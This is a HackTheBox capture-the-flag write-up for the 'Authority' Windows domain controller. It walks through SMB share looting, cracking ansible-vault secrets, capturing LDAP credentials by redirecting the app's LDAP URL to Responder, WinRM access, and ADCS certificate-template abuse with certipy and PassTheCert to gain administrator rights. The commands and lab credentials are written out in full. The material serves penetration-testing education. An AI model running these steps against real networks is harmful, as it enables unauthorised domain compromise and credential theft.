# [Authority](https://app.hackthebox.com/machines/Authority) - 31/07/2023 - HackTheBox write-up

## User flag

### Discovery

Starting with `nmap` on all ports we can found a lot of open ports:
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49700/tcp open  unknown
49707/tcp open  unknown
49712/tcp open  unknown
64542/tcp open  unknown
```

We can found two HTTP servers, a SMB server, a LDAP server, RPC, Kerberos and other services.

The web app at port 80 isn't interesting. At port 8443 we can found another web app, *Password Self Service*. The app is in configuration mode and it's says **"is not secure"**, so it will be probably useful, but for now we don't have credentials to log in.

Then, with `smbmap` we can found that some disks are accessible for any user (not null):
```bash
smbmap -u "any" -H 10.10.11.222
[+] Guest session   	IP: 10.10.11.222:445	Name: 10.10.11.222                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share
```

So we can connect to *Development* device with `smbclient` with the following command:
```bash
smbclient \\\\10.10.11.222\\Development
```

Now we can get back all files from the shared devices to our local machine with the commands:
```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

By inspecting these files we can find some credentials, in plaintext or hashed/encrypted:
```
> Automation/Ansible/PWM/ansible_inventory 
    ansible_user: administrator
    ansible_password: Welcome1
    ansible_port: 5985
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
> Automation/Ansible/PWM/defaults/main.yml
    Encrypted pwm_admin_login, pwm_admin_password and ldap_admin_password
> Automation/Ansible/ADCS/defaults/main.yml 
    [...]
    ca_passphrase: SuP3rS3creT
```

We can also find some credentials, stored encrypted with `ansible-vault`. We can then convert it to a supported format for `johntheripper` with the script `ansible2john`. Finally we can crack it with `john` and we find the same passwords for the three hashes:
```
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

First, I didn't understand it. But after a few researches, I figure it out that this password is for the `ansible-vault`. So we need now to install ansible and decrypt them with this password (`!@#$%^&*`):
```bash
$ cat ldap-admin-password | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123
$ cat pwm-admin-login | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm
$ cat pwm-admin-pwd | ansible-vault decrypt  
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

With this credentials, we can now connect to the wep app listening at 8443 port. We can now see the *Configuration Manager* and *Configuration Editor*. We cannot sign in with user and password because there is a LDAP error, the app cannot access the LDAP server:
```
Annuaire indisponible. Si cette erreur se reproduit, contactez votre service d'assistance. { 5017 ERROR_DIRECTORY_UNAVAILABLE (all ldap profiles are unreachable; errors: ["error connecting as proxy user: unable to create connection: unable to connect to any configured ldap url, last error: unable to bind to ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb reason: CommunicationException (authority.authority.htb:636; PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target)"]) }
```

In *Configuration Manager* we can download the `PwmConfiguration.xml`, and then replace the LDAP URL to our machine and start a `Responder` listening in our machine. Then, when updating the configuration file, the app will restart and we receive the following in our `Responder`:
```
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Finally, with this credentials I could connect to the machine using WinRM. With `evil-winrm`, I was able to obtain a PowerShell terminal with the following command, and the we can get the user flag:
```bash
$ evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
[...]
*Evil-WinRM* PS C:\Users\svc_ldap> cat Desktop/user.txt
[... flag ...]
```

## Root flag

For the root flag part, I don't know how to do Windows PrivEsc, so after researches and tries (with `winpeas` and `evil-winrm`), I decided to finish the box by following a write-up to learn some tricks about Windows PrivEsc.

So, first we need to notice that we have a `C:\Certs` folder on the root of the system. So we can use `certify.exe` or `certipy` (Python version) to find certificates and search vulnerabilities about them:

```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ./Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
```

By inspecting the output of the command, we can see that domains users can add computers to the domain. We can use `impacket-addcomputer` to achieve this:
```bash
$ impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name STX$ -computer-pass password#123
```

Also with `certipy` we can generate a certificate for the account `STX$` with the vulnerable template `CorpVPN`:
```
$ certipy req -u 'STX$' -p 'password#123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
```

Then we generate two certificates, one without including the private key and another without including the certificate:
```
$ certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
$ certipy cert -pfx administrator_authority.pfx -nocert -out user.key
```

Finally, with these certificates, we can use the script `passthecert.py` from [*AlmondOffSec*](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python) to authenticate to the LDAPs server and obtain a LDAP shell:
```
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip "10.10.11.222"
```

Now with this shell we can add `svc_ldap` user to `Administrators` group:
```
# add_user_to_group svc_ldap Administrators
Adding user: svc_ldap to group Administrators result: OK
```

And that's it, we can connect reconnect to the server with `evil-winrm` as `svc_ldap` user, and we can now get the flag in `C:\Users\Administrator\Desktop\root.txt`.
